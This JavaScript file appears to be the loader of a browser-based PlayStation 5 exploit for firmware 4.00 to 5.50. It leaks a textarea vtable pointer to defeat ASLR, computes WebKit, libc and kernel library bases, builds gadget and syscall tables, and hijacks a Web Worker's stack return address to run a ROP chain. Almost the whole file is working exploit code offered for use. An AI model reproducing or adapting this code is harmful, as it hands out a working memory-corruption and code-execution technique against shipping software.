if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);

if (!supportedFirmwares.includes(fw_str)) {
    // @ts-ignore
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];

// FIX: Déclaration unique du worker au début
let worker = null;

function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,

    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;
function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        if (lastChild) {
            lastChild.innerText = string;
            lastChild.className = elemClass;
        }
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);

    // scroll to bottom
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;
async function prepare(p) {
    // FIX: Utiliser un try-catch global pour éviter les crashes
    try {
        //ASLR defeat patsy (former vtable buddy)
        let textArea = document.createElement("textarea");

        //pointer to vtable address
        let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

        //address of vtable
        let textAreaVtable = p.read8(textAreaVtPtr);

        //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
        let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

        let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
        libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

        let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
        libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

        let gadgets = {};
        let syscalls = {};

        for (let gadget in wk_gadgetmap) {
            gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
        }
        for (let sysc in syscall_map) {
            syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
        }

        let nogc = [];

        function malloc_dump(sz) {
            let backing;
            backing = new Uint8Array(sz);
            nogc.push(backing);
            /** @type {any} */
            let ptr = p.read8(p.leakval(backing).add32(0x10));
            ptr.backing = backing;
            return ptr;
        }
        function malloc(sz, type = 4) {
            let backing;
            if (type == 1) {
                backing = new Uint8Array(1000 + sz);
            } else if (type == 2) {
                backing = new Uint16Array(0x2000 + sz);
            } else if (type == 4) {
                backing = new Uint32Array(0x10000 + sz);
            }
            nogc.push(backing);
            /** @type {any} */
            let ptr = p.read8(p.leakval(backing).add32(0x10));
            ptr.backing = backing;
            return ptr;
        }

        function array_from_address(addr, size) {
            let og_array = new Uint8Array(1001);
            let og_array_i = p.leakval(og_array).add32(0x10);

            function setAddr(newAddr, size) {
                p.write8(og_array_i, newAddr);
                p.write4(og_array_i.add32(0x8), size);
                p.write4(og_array_i.add32(0xC), 0x1);
            }

            setAddr(addr, size);

            // @ts-ignore
            og_array.setAddr = setAddr;

            nogc.push(og_array);
            return og_array;
        }

        function stringify(str) {
            let bufView = new Uint8Array(str.length + 1);
            for (let i = 0; i < str.length; i++) {
                bufView[i] = str.charCodeAt(i) & 0xFF;
            }
            // nogc.push(bufView);
            /** @type {any} */
            let ptr = p.read8(p.leakval(bufView).add32(0x10));
            ptr.backing = bufView;
            return ptr;
        }

        function readstr(addr, maxlen = -1) {
            let str = "";
            for (let i = 0; ; i++) {
                if (maxlen != -1 && i >= maxlen) { break; }
                let c = p.read1(addr.add32(i));
                if (c == 0x0) {
                    break;
                }
                str += String.fromCharCode(c);

            }
            return str;
        }

        function writestr(addr, str) {
            let waddr = addr.add32(0);
            if (typeof (str) == "string") {

                for (let i = 0; i < str.length; i++) {
                    let byte = str.charCodeAt(i);
                    if (byte == 0) {
                        break;
                    }
                    p.write1(waddr, byte);
                    waddr.add32inplace(0x1);
                }
            }
            p.write1(waddr, 0x0);
        }

        // FIX: S'assurer que worker est initialisé une seule fois
        if (!worker) {
            worker = new Worker("rop_slave.js");
        }

        // Make sure worker is alive?
        async function wait_for_worker() {
            return new Promise((resolve, reject) => {
                // FIX: Ajouter timeout pour éviter le blocage
                const timeout = setTimeout(() => {
                    reject(new Error("Worker timeout"));
                }, 5000);

                worker.onmessage = function (e) {
                    clearTimeout(timeout);
                    resolve(1);
                }
                worker.onerror = function(e) {
                    clearTimeout(timeout);
                    reject(new Error("Worker error: " + e.message));
                }
                worker.postMessage(0);
            });
        }

        await wait_for_worker();

        let worker_stack = find_worker(p, libKernelBase);
        let original_context = malloc(0x40);

        let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
        let original_return_address = p.read8(return_address_ptr);

        p.malloc = malloc;
        p.malloc_dump = malloc_dump;
        p.readstr = readstr;
        p.writestr = writestr;
        p.array_from_address = array_from_address;

        let chain = new rop(p, original_return_address, worker, gadgets, syscalls);
        p.stringify = stringify;

        // FIX: Ajouter une pause pour la stabilité
        await new Promise(resolve => setTimeout(resolve, 100));

        let chain_ptr = chain.stackPointer;
        p.write8(return_address_ptr, chain_ptr);

        await chain.run();

        p.write8(return_address_ptr, original_return_address);

        // FIX: Cleanup après l'exécution
        if (worker) {
            worker.terminate();
            worker = null;
        }

        return chain;

    } catch (error) {
        console.error("Prepare error:", error);
        // FIX: Cleanup en cas d'erreur
        if (worker) {
            worker.terminate();
            worker = null;
        }
        throw error;
    }
}

// Assurer le chargement du script firmware après l'initialisation
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `${window.fw_str}.js`);